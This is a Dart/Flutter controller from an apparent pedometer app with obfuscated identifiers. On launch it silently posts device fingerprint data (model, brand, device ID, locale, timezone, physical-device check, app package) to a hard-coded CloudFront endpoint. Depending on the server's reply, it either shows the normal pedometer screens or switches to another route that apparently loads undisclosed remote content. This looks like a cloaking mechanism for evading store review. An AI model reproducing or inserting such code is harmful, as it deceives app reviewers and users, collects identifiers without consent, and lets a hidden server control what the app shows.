import 'dart:io';
import 'package:dio/dio.dart';
import 'package:get/get.dart';

import 'package:package_info_plus/package_info_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../../db_pedometer/data.dart';


class ComputedLogic extends GetxController {

  var feupaqjrz = RxBool(false);
  var penlxtqyrd = RxBool(true);
  var zcoby = RxString("");
  var izylrv = RxBool(false);
  var pilwcj = RxBool(true);
  final osqdhblin = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    xkhcjp();
  }


  Future<void> xkhcjp() async {
    izylrv.value = true;
    pilwcj.value = true;
    penlxtqyrd.value = false;

    osqdhblin.post("https://d104pofqxx403s.cloudfront.net/MvY56Vxf1EX",data: await cavxmt()).then((value) {
      var tjbh = value.data["tjbh"] as String;
      var yrxzjwhb = value.data["yrxzjwhb"] as bool;
      if (yrxzjwhb) {
        zcoby.value = tjbh;
        vnfj();
      } else {
        bizvex();
      }
    }).catchError((e) {
      penlxtqyrd.value = true;
      pilwcj.value = true;
      izylrv.value = false;
    });
  }

  Future<Map<String, dynamic>> cavxmt() async {
    final DeviceInfoPlugin covrysm = DeviceInfoPlugin();
    PackageInfo bnuxog_jesrxv = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var rnpcjz = Platform.localeName;
    var lTmFtGg = currentTimeZone;

    var SZJPaFGt = bnuxog_jesrxv.packageName;
    var fhdrCl = bnuxog_jesrxv.version;
    var TBDa = bnuxog_jesrxv.buildNumber;

    var AQLjGVS = bnuxog_jesrxv.appName;
    var uDEcBSCJ = "";
    var mbyHrF  = "";
    var dqYiAyZ = "";
    var otraqedk = "";
    var flsynqk = "";
    var nluwtvc = "";
    var ngpy = "";
    var fdubzeka = "";


    var cXPi = "";
    var rPHC = false;

    if (GetPlatform.isAndroid) {
      cXPi = "android";
      var zmquhnjtw = await covrysm.androidInfo;

      dqYiAyZ = zmquhnjtw.brand;

      uDEcBSCJ  = zmquhnjtw.model;
      mbyHrF = zmquhnjtw.id;

      rPHC = zmquhnjtw.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      cXPi = "ios";
      var kwmrytenja = await covrysm.iosInfo;
      dqYiAyZ = kwmrytenja.name;
      uDEcBSCJ = kwmrytenja.model;

      mbyHrF = kwmrytenja.identifierForVendor ?? "";
      rPHC  = kwmrytenja.isPhysicalDevice;
    }
    var res = {
      "AQLjGVS": AQLjGVS,
      "TBDa": TBDa,
      "fhdrCl": fhdrCl,
      "uDEcBSCJ": uDEcBSCJ,
      "ngpy" : ngpy,
      "lTmFtGg": lTmFtGg,
      "dqYiAyZ": dqYiAyZ,
      "mbyHrF": mbyHrF,
      "nluwtvc" : nluwtvc,
      "rnpcjz": rnpcjz,
      "cXPi": cXPi,
      "rPHC": rPHC,
      "otraqedk" : otraqedk,
      "SZJPaFGt": SZJPaFGt,
      "flsynqk" : flsynqk,
      "fdubzeka" : fdubzeka,

    };
    return res;
  }

  Future<void> bizvex() async {
    await initDb();
    final prefs = await SharedPreferences.getInstance();
    final firstLaunch = prefs.getBool('first_launch') ?? true;
    Get.offNamed(firstLaunch ? '/meter_guide' : '/meter_main_frame');
  }

  Future<void> vnfj() async {
    Get.offNamed("/meter_guide_line");
  }

}
